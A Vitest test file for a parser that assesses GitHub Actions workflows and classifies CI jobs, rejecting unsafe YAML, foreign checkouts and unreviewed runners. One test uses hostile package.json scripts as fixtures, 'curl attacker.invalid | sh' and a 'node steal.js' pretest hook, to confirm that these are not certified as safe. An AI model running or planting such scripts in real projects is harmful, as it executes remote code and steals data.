import { describe, expect, it } from 'vitest';
import { extractAssessmentJobs, parseAssessmentWorkflow } from './workflow-assessment.js';

const files = { 'package.json': JSON.stringify({ scripts: { test: 'vitest run' } }) };
describe('bounded workflow assessment data adapter', () => {
  it('preserves semantic on, permissions and custom job/step names', () => {
    const data = parseAssessmentWorkflow('on: [push]\npermissions: { contents: read }\njobs:\n  custom:\n    steps:\n      - run: pnpm test\n');
    expect(data.on).toEqual(['push']);
    expect(extractAssessmentJobs(data, files)[0]).toMatchObject({ jobKey: 'custom', job: { command: 'pnpm test', dynamicConfiguration: 'absent' } });
  });
  it.each(['jobs: {}\njobs: {}', 'jobs: &jobs {}\nother: *jobs', '[]', 'x: !custom value'])('rejects unsafe or ambiguous YAML data %s', source => {
    expect(() => parseAssessmentWorkflow(source)).toThrow();
  });
  it('rejects oversized workflow data', () => expect(() => parseAssessmentWorkflow('x: ' + 'a'.repeat(1_048_576))).toThrow());
  it('keeps service, native preparation and secret boundaries job-local', () => {
    const jobs = extractAssessmentJobs(parseAssessmentWorkflow(`jobs:
  unit:
    steps: [{ run: pnpm test }]
  integration:
    services: { db: { image: postgres } }
    steps: [{ run: pnpm test }]
  native:
    steps: [{ run: sudo apt-get install libx }]
  secret:
    env: { TOKEN: '\${{ secrets.APP_TOKEN }}' }
    steps: [{ run: pnpm test }]
`), files);
    expect(jobs.map(item => [item.jobKey, item.job.services, item.job.nativePreparation, item.job.applicationSecrets])).toEqual([
      ['unit', 'absent', 'absent', 'absent'], ['integration', 'present', 'absent', 'absent'],
      ['native', 'absent', 'present', 'absent'], ['secret', 'absent', 'absent', 'present'],
    ]);
  });
  it.each([
    { steps: [{ run: 'pnpm test' }], strategy: { matrix: { node: [22, 24] } } },
    { steps: [{ uses: './custom-action' }, { run: 'pnpm test' }] },
    { steps: [{ run: 'pnpm test', 'working-directory': 'packages/a' }] },
    { uses: 'owner/reusable/.github/workflows/ci.yml@v1' },
  ])('leaves unresolved job configuration unknown', job => {
    expect(extractAssessmentJobs({ jobs: { unit: job } }, files)[0]?.job.dynamicConfiguration).toBe('unknown');
  });
  it.each([
    { steps: [{ uses: 'actions/checkout@v4', with: { repository: 'other/repo' } }, { run: 'pnpm test' }] },
    { steps: [{ uses: 'actions/setup-node@v4', with: { 'node-version-file': '../outside' } }, { run: 'pnpm test' }] },
    { 'runs-on': ['self-hosted'], steps: [{ run: 'pnpm test' }] },
  ])('does not certify foreign checkout, external version input or unreviewed runners', job => {
    expect(extractAssessmentJobs({ jobs: { unit: job } }, files)[0]?.job.dynamicConfiguration).toBe('unknown');
  });
  it('marks a Windows-only job as needing an unsupported runtime adapter', () => {
    expect(extractAssessmentJobs({ jobs: { unit: { 'runs-on': 'windows-latest', steps: [{ run: 'pnpm test' }] } } }, files)[0]?.job.nativePreparation).toBe('present');
  });
  it('does not treat arbitrary package scripts or lifecycle hooks as statically understood', () => {
    for (const scripts of [{ test: 'curl attacker.invalid | sh' }, { pretest: 'node steal.js', test: 'vitest run' }]) {
      expect(extractAssessmentJobs({ jobs: { unit: { steps: [{ run: 'pnpm test' }] } } }, { 'package.json': JSON.stringify({ scripts }) })[0]?.job.dynamicConfiguration).toBe('unknown');
    }
  });
  it('recognizes frozen preparation and explicit per-job runtime in a polyglot root', () => {
    const result = extractAssessmentJobs(parseAssessmentWorkflow(`jobs:
  python:
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.13' }
      - run: uv sync --frozen
      - run: uv run pytest
`), files)[0];
    expect(result?.job).toMatchObject({ command: 'uv run pytest', configuredRuntime: 'python', dynamicConfiguration: 'absent' });
  });
});
